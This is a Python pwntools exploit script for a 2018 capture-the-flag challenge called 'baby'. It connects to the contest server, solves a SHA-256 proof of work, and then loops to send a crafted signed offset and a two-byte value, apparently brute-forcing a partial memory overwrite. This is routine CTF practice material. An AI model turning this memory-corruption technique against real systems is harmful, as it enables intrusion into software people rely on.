#!/usr/bin/env python2

import os
import struct
from time import sleep
from pwn import *

context.terminal = 'tmux splitw -h'.split()

# CHANGE THESE
exe = context.binary = ELF('./baby')

gdbscript = """
break main
continue
""".format(**locals())

def start(argv=[], *a, **kw):
	if args.GDB:
		io = gdb.debug([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		# AND THIS
		io = remote("e4771e24.quals2018.oooverflow.io",31337)
		s = io

		# Solve the PoW
		s.recvuntil("Challenge:")
		challenge = s.recvuntil("\n").strip()
		s.recvuntil("n:")
		n = int(s.recvuntil("\n").strip())
		log.info('Solving challenge: "{}", n: {}'.format(challenge, n))
		solution = solve_pow(challenge, n)
		log.info('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
		s.recvuntil("Solution: ")
		s.sendline(str(solution))
		

	else:
		io = process([exe.path] + argv, env={"LD_LIBRARY_PATH":"."}, *a, **kw)
	return io

# inspired by C3CTF's POW

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

r = start()	

for i in range(0x4000, 0x9ff8, 8):
    log.info("Starting... %x", i)
    r.send(p64(-0x60+5*8, sign="signed"))
    #r.send('AAAAAAAA')
    sleep(0.25)
    r.send(p16(0x4f48))
    #r.send(p16(i))
    data = r.recvuntil("Go")
    if data.strip() != "Go":
        print data.encode('hex')

	

r.close()

